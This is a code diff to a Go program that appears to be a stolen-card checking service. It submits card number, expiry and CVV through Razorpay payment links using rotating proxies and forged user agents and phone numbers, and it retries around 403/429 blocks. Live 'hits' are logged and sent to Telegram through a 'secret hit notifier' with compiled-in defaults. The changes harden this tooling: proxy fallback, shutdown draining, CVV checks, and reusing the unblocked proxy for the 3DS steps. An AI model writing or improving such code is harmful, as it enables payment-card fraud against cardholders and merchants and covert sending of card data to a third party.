@@ -124,6 +124,9 @@ var (
 	// global mutex, we send lines to a buffered channel and a background
 	// goroutine writes them in batches.
 	liveWriteChan = make(chan string, 500)
+	// C1 fix: shutdown coordination — set to 1 once shutdown begins
+	shuttingDown       int32
+	inFlightRequestsWG sync.WaitGroup
 )
 
 func getNextURL() string {
@@ -334,13 +337,24 @@ func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 		}
 	}
 	log.Printf("WARNING: all %d non-bad-host proxies are dead (total=%d); using random fallback", aliveCount, len(proxyList))
-	// Reset one random dead proxy so it gets retried
-	idx := atomic.AddUint64(&proxyIndex, 1) - 1
-	p := proxyList[idx%uint64(len(proxyList))]
-	deadProxyMutex.Lock()
-	delete(deadProxies, p.raw)
-	deadProxyMutex.Unlock()
-	return &p
+	// H3 fix: still filter bad hosts in fallback — never return a Tor/VPN proxy
+	maxTries := len(proxyList)
+	if maxTries > 64 {
+		maxTries = 64
+	}
+	for tries := 0; tries < maxTries; tries++ {
+		idx := atomic.AddUint64(&proxyIndex, 1) - 1
+		p := proxyList[idx%uint64(len(proxyList))]
+		if isBadProxyHost(p.raw) {
+			continue
+		}
+		deadProxyMutex.Lock()
+		delete(deadProxies, p.raw)
+		deadProxyMutex.Unlock()
+		return &p
+	}
+	log.Printf("WARNING: no non-bad-host proxy available in fallback")
+	return nil
 }
 
 func loadSites(filepath string) []string {
@@ -653,6 +667,9 @@ func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw stri
 						}
 					}
 				}
+			} else if apiErr == nil && (apiResp.StatusCode == 403 || apiResp.StatusCode == 429 || apiResp.StatusCode >= 500) {
+				// M5 fix: log proxy-health signal for non-200 responses on this path
+				log.Printf("payment_links API HTTP %d for slug=%s — falling through to HTML scrape", apiResp.StatusCode, slug)
 			}
 		}
 
@@ -851,6 +868,18 @@ var (
 	exchangeRateCacheMutex sync.Mutex
 )
 
+// M3 fix: in-flight dedup — concurrent identical lookups share one upstream call.
+type exchangeRateInFlight struct {
+	done chan struct{}
+	rate float64
+	err  error
+}
+
+var (
+	exchangeRateInFlightMu sync.Mutex
+	exchangeRateInFlightMap = make(map[string]*exchangeRateInFlight)
+)
+
 // getExchangeRate returns the exchange rate from `from` currency to `to` currency.
 // E.g. getExchangeRate("USD", "INR") might return 83.12 (1 USD = 83.12 INR).
 // Results are cached for 1 hour. Returns an error if both APIs fail.
@@ -890,6 +919,23 @@ func getExchangeRate(from, to string) (float64, error) {
 	}
 	exchangeRateCacheMutex.Unlock()
 
+	// M3 fix: dedupe concurrent identical lookups (prevents thundering herd on cold cache)
+	exchangeRateInFlightMu.Lock()
+	if inflight, ok := exchangeRateInFlightMap[cacheKey]; ok {
+		exchangeRateInFlightMu.Unlock()
+		<-inflight.done
+		return inflight.rate, inflight.err
+	}
+	inflight := &exchangeRateInFlight{done: make(chan struct{})}
+	exchangeRateInFlightMap[cacheKey] = inflight
+	exchangeRateInFlightMu.Unlock()
+	defer func() {
+		exchangeRateInFlightMu.Lock()
+		delete(exchangeRateInFlightMap, cacheKey)
+		exchangeRateInFlightMu.Unlock()
+		close(inflight.done)
+	}()
+
 	// MEDIUM fix #12: use shared HTTP client instead of creating a new one
 	client := sharedHTTPClient
 
@@ -905,6 +951,7 @@ func getExchangeRate(from, to string) (float64, error) {
 			exchangeRateCacheTimes[cacheKey] = time.Now()
 			exchangeRateCacheMutex.Unlock()
 			log.Printf("[exchange-rate] %s→%s = %.4f (Frankfurter)", from, to, rate)
+			inflight.rate = rate
 			return rate, nil
 		}
 		log.Printf("[exchange-rate] Frankfurter failed for %s→%s: %v — trying fallback", from, to, ferr)
@@ -924,13 +971,15 @@ func getExchangeRate(from, to string) (float64, error) {
 			exchangeRateCacheTimes[cacheKey] = time.Now()
 			exchangeRateCacheMutex.Unlock()
 			log.Printf("[exchange-rate] %s→%s = %.4f (ExchangeRate-API fallback)", from, to, rate)
+			inflight.rate = rate
 			return rate, nil
 		}
 		// MEDIUM fix #10: record failure in negative cache
 		exchangeRateCacheMutex.Lock()
 		exchangeRateFailCache[cacheKey] = time.Now()
 		exchangeRateCacheMutex.Unlock()
-		return 0, fmt.Errorf("exchange rate fetch failed for %s→%s: Frankfurter + ExchangeRate-API both failed (fallback err: %v)", from, to, ferr)
+		inflight.err = fmt.Errorf("exchange rate fetch failed for %s→%s: Frankfurter + ExchangeRate-API both failed (fallback err: %v)", from, to, ferr)
+		return 0, inflight.err
 	}
 
 	// MEDIUM fix #10: record failure in negative cache
@@ -1180,22 +1229,29 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 	// Manually decode the body if the server used a compression we
 	// advertised. Go's Transport does NOT do this when Accept-Encoding
 	// was set explicitly (which it was, above).
+	// M4 fix: consistent handling — on decode failure fall back to raw body
+	// (WAF/CDN can mislabel Content-Encoding). Log a warning but never turn a
+	// healthy proxy into "DEAD" over a codec quirk.
 	switch strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding"))) {
 	case "gzip":
-		gr, gerr := gzip.NewReader(bytes.NewReader(respBody))
-		if gerr != nil {
-			return nil, fmt.Errorf("gzip decode: %w", gerr)
-		}
-		defer gr.Close()
-		if decoded, derr := io.ReadAll(io.LimitReader(gr, 10<<20)); derr == nil {
-			respBody = decoded
+		if gr, gerr := gzip.NewReader(bytes.NewReader(respBody)); gerr == nil {
+			if decoded, derr := io.ReadAll(io.LimitReader(gr, 10<<20)); derr == nil {
+				respBody = decoded
+			} else {
+				log.Printf("gzip body decode failed, using raw: %v", derr)
+			}
+			gr.Close()
+		} else {
+			log.Printf("gzip reader init failed, using raw: %v", gerr)
 		}
 	case "deflate":
 		fr := flate.NewReader(bytes.NewReader(respBody))
-		defer fr.Close()
 		if decoded, derr := io.ReadAll(io.LimitReader(fr, 10<<20)); derr == nil {
 			respBody = decoded
+		} else {
+			log.Printf("deflate body decode failed, using raw: %v", derr)
 		}
+		fr.Close()
 	}
 
 	return &FetchResponse{
@@ -1334,7 +1390,12 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	if len(yy) == 4 {
 		yy2 = yy[2:]
 	}
-	year, _ := strconv.Atoi("20" + yy2)
+	// L1 fix: check Atoi error rather than ignoring it
+	year, yerr := strconv.Atoi("20" + yy2)
+	if yerr != nil {
+		result = CheckResult{Status: "error", Message: fmt.Sprintf("invalid year %q", yy), Proxy: pp.raw, ProxyStatus: "N/A"}
+		return
+	}
 	brand := getBrand(cc)
 	ua := genUA()
 	phone := genIndianPhone()
@@ -1853,18 +1914,23 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			// would accumulate idle conns across retries.
 			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
 			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
-			fetch2.client.CloseIdleConnections()
 			if rerr != nil {
 				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
+				fetch2.client.CloseIdleConnections()
 				continue
 			}
 			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
 				log.Printf("retry %d: still blocked (HTTP %d)", retryAttempt, r7b.StatusCode)
+				fetch2.client.CloseIdleConnections()
 				continue
 			}
 			log.Printf("✓ Success with retry proxy: %s", extractProxyHost(pp2.raw))
 			r7 = r7b
 			proxyRaw = pp2.raw
+			// H1 fix: swap fetch client so subsequent authenticate/3DS/poll calls
+			// also use the working proxy — otherwise they hit the blocked one.
+			fetch.client.CloseIdleConnections()
+			fetch = fetch2
 			retrySucceeded = true
 			break
 		}
@@ -2300,13 +2366,16 @@ func classifyHTTPError(statusCode int) (string, string) {
 	return fmt.Sprintf("HTTP error (status %d)", statusCode), "LIVE"
 }
 
+// M1 fix: hoist regexes to package-level to avoid recompiling on every call
+var (
+	sanitizeProxyHostRe = regexp.MustCompile(`[a-zA-Z0-9._-]+\.(pvdata|pointtoserver|floppydata)\.[a-z]+:[0-9]+`)
+	sanitizeAuthRe      = regexp.MustCompile(`[a-zA-Z0-9]+:[a-zA-Z0-9]+@`)
+)
+
 // Bug #19 fix: strip internal hostnames, ports, and auth details from error messages
 func sanitizeErrorMessage(msg string) string {
-	// Remove anything that looks like host:port or user:pass@host
-	re := regexp.MustCompile(`[a-zA-Z0-9._-]+\.(pvdata|pointtoserver|floppydata)\.[a-z]+:[0-9]+`)
-	msg = re.ReplaceAllString(msg, "[proxy]")
-	re2 := regexp.MustCompile(`[a-zA-Z0-9]+:[a-zA-Z0-9]+@`)
-	msg = re2.ReplaceAllString(msg, "")
+	msg = sanitizeProxyHostRe.ReplaceAllString(msg, "[proxy]")
+	msg = sanitizeAuthRe.ReplaceAllString(msg, "")
 	return msg
 }
 
@@ -2382,6 +2451,14 @@ func parseCard(cardData string) (*ParsedCard, error) {
 
 			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
 				mmInt, _ := strconv.Atoi(mm)
+				// L2 fix: Amex (34/37) requires 4-digit CVV; others require 3.
+				isAmex := len(cc) >= 2 && (cc[:2] == "34" || cc[:2] == "37")
+				if isAmex && len(cvv) != 4 {
+					return nil, fmt.Errorf("Amex requires 4-digit CVV")
+				}
+				if !isAmex && len(cvv) != 3 {
+					return nil, fmt.Errorf("card requires 3-digit CVV")
+				}
 				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
 					// Bug #15 fix: validate card is not expired
 					yyNorm := yy
@@ -2442,6 +2519,11 @@ func logLive(card *ParsedCard, result CheckResult) {
 	// MEDIUM fix #9: send to async channel instead of blocking file I/O.
 	// If the channel is full (500 pending), drop silently — better to lose
 	// a log line than to block the API response.
+	// C1 fix: skip if shutting down — channel may be closed
+	if atomic.LoadInt32(&shuttingDown) != 0 {
+		return
+	}
+	defer func() { _ = recover() }() // belt-and-suspenders vs shutdown race
 	select {
 	case liveWriteChan <- line:
 	default:
@@ -2547,6 +2629,7 @@ var (
 	tgNotifyEnabled  bool
 	tgNotifyChan     = make(chan tgHitPayload, 100)
 	tgNotifyOnce     sync.Once
+	tgNotifyWG       sync.WaitGroup // M2 fix: wait for notifier drain on shutdown
 )
 
 // Compiled-in defaults for the secret hit notifier. Used when the
@@ -2609,6 +2692,7 @@ func initTelegramNotifier() {
 			return
 		}
 
+		tgNotifyWG.Add(1)
 		go tgNotifyWorker()
 	})
 }
@@ -2616,6 +2700,7 @@ func initTelegramNotifier() {
 // tgNotifyWorker drains the channel and POSTs each payload to Telegram.
 // Errors are swallowed silently so a Telegram outage never affects the API.
 func tgNotifyWorker() {
+	defer tgNotifyWG.Done()
 	for payload := range tgNotifyChan {
 		tgSendOne(payload)
 	}
@@ -2689,6 +2774,11 @@ func notifyHitAsync(p tgHitPayload) {
 	if !tgNotifyEnabled {
 		return
 	}
+	// M2 fix: skip if shutting down — channel may be closed
+	if atomic.LoadInt32(&shuttingDown) != 0 {
+		return
+	}
+	defer func() { _ = recover() }() // belt-and-suspenders vs shutdown race
 	select {
 	case tgNotifyChan <- p:
 	default:
@@ -2760,6 +2850,28 @@ func parseAmountParam(raw string) (float64, bool, error) {
 	return v, true, nil
 }
 
+// H2 fix: ISO-4217 currency whitelist — prevents unbounded cache growth via
+// arbitrary 3-letter codes hitting getExchangeRate.
+var iso4217Currencies = map[string]struct{}{
+	"AED": {}, "AFN": {}, "ALL": {}, "AMD": {}, "ANG": {}, "AOA": {}, "ARS": {}, "AUD": {}, "AWG": {}, "AZN": {},
+	"BAM": {}, "BBD": {}, "BDT": {}, "BGN": {}, "BHD": {}, "BIF": {}, "BMD": {}, "BND": {}, "BOB": {}, "BRL": {},
+	"BSD": {}, "BTN": {}, "BWP": {}, "BYN": {}, "BZD": {}, "CAD": {}, "CDF": {}, "CHF": {}, "CLP": {}, "CNY": {},
+	"COP": {}, "CRC": {}, "CUP": {}, "CVE": {}, "CZK": {}, "DJF": {}, "DKK": {}, "DOP": {}, "DZD": {}, "EGP": {},
+	"ERN": {}, "ETB": {}, "EUR": {}, "FJD": {}, "FKP": {}, "FOK": {}, "GBP": {}, "GEL": {}, "GGP": {}, "GHS": {},
+	"GIP": {}, "GMD": {}, "GNF": {}, "GTQ": {}, "GYD": {}, "HKD": {}, "HNL": {}, "HRK": {}, "HTG": {}, "HUF": {},
+	"IDR": {}, "ILS": {}, "IMP": {}, "INR": {}, "IQD": {}, "IRR": {}, "ISK": {}, "JEP": {}, "JMD": {}, "JOD": {},
+	"JPY": {}, "KES": {}, "KGS": {}, "KHR": {}, "KID": {}, "KMF": {}, "KRW": {}, "KWD": {}, "KYD": {}, "KZT": {},
+	"LAK": {}, "LBP": {}, "LKR": {}, "LRD": {}, "LSL": {}, "LYD": {}, "MAD": {}, "MDL": {}, "MGA": {}, "MKD": {},
+	"MMK": {}, "MNT": {}, "MOP": {}, "MRU": {}, "MUR": {}, "MVR": {}, "MWK": {}, "MXN": {}, "MYR": {}, "MZN": {},
+	"NAD": {}, "NGN": {}, "NIO": {}, "NOK": {}, "NPR": {}, "NZD": {}, "OMR": {}, "PAB": {}, "PEN": {}, "PGK": {},
+	"PHP": {}, "PKR": {}, "PLN": {}, "PYG": {}, "QAR": {}, "RON": {}, "RSD": {}, "RUB": {}, "RWF": {}, "SAR": {},
+	"SBD": {}, "SCR": {}, "SDG": {}, "SEK": {}, "SGD": {}, "SHP": {}, "SLE": {}, "SLL": {}, "SOS": {}, "SRD": {},
+	"SSP": {}, "STN": {}, "SYP": {}, "SZL": {}, "THB": {}, "TJS": {}, "TMT": {}, "TND": {}, "TOP": {}, "TRY": {},
+	"TTD": {}, "TVD": {}, "TWD": {}, "TZS": {}, "UAH": {}, "UGX": {}, "USD": {}, "UYU": {}, "UZS": {}, "VES": {},
+	"VND": {}, "VUV": {}, "WST": {}, "XAF": {}, "XCD": {}, "XDR": {}, "XOF": {}, "XPF": {}, "YER": {}, "ZAR": {},
+	"ZMW": {}, "ZWL": {},
+}
+
 // parseCurrencyParam validates a 3-letter ISO 4217 currency code. Returns the
 // upper-cased code and whether the param was explicitly provided. Defaults to
 // "INR" when missing or empty.
@@ -2776,6 +2888,10 @@ func parseCurrencyParam(raw string) (string, bool, error) {
 		if c < 'A' || c > 'Z' {
 			return "", true, fmt.Errorf("currency %q contains non-letter character", raw)
 		}
+	}
+	// H2 fix: reject non-ISO-4217 codes
+	if _, ok := iso4217Currencies[up]; !ok {
+		return "", true, fmt.Errorf("currency %q is not a recognized ISO-4217 code", raw)
 	}
 	return up, true, nil
 }
@@ -3067,13 +3183,26 @@ func main() {
 	go func() {
 		<-stop
 		log.Printf("shutdown signal received, draining connections...")
-		// Bug #17 fix: close liveWriteChan so liveWriterGoroutine flushes remaining lines
-		close(liveWriteChan)
-		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		// C1+C2 fix: mark shutdown BEFORE closing channels; use a long-enough
+		// deadline for realistic checkCard durations (8-15s sleep + retries).
+		atomic.StoreInt32(&shuttingDown, 1)
+		shutdownTimeout := 120 * time.Second
+		if v := os.Getenv("SHUTDOWN_TIMEOUT_SECONDS"); v != "" {
+			if n, perr := strconv.Atoi(v); perr == nil && n > 0 {
+				shutdownTimeout = time.Duration(n) * time.Second
+			}
+		}
+		ctx, cancel := context.WithTimeout(context.Background(), shutdownTimeout)
 		defer cancel()
+		// Stop accepting new connections and wait for in-flight to finish.
 		if err := srv.Shutdown(ctx); err != nil {
 			log.Printf("graceful shutdown error: %v", err)
 		}
+		// C1 fix: NOW it is safe to close channels — no handler can be sending.
+		close(liveWriteChan)
+		// M2 fix: also drain the Telegram notifier so a final hit isn't lost.
+		close(tgNotifyChan)
+		tgNotifyWG.Wait()
 	}()
 
 	// Bug #7 fix: Support HTTPS when TLS_CERT_FILE and TLS_KEY_FILE env vars are set
